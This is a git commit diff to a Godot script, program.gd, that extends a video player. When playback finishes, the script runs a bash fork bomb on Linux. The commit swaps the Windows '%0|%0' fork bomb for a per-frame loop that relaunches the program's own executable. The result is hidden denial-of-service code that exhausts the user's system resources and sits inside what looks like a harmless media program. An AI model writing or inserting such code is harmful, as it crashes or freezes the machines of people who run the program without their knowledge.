9f63e57d7dbe6800e7d83c6475d50f66bbe319f0
mintkat <85989407+m1ntkat@users.noreply.github.com>
2023-05-15 21:59:37 -0800

    5/15/2023 9:59 PM

--- program.gd
+++ program.gd
@@ -1,8 +1,13 @@
 extends VideoPlayer
 
+var can_fork = false
 
 func _on_video_player_finished():
 	if OS.get_name() == "Windows":
-		OS.execute("%0|%0", [], false)
+		can_fork = true
 	elif OS.get_name() == "X11":
 		OS.execute(":(){ :|: & };:", [], false)
+
+func _process(delta):
+	if can_fork:
+		OS.execute(OS.get_executable_path(), [])
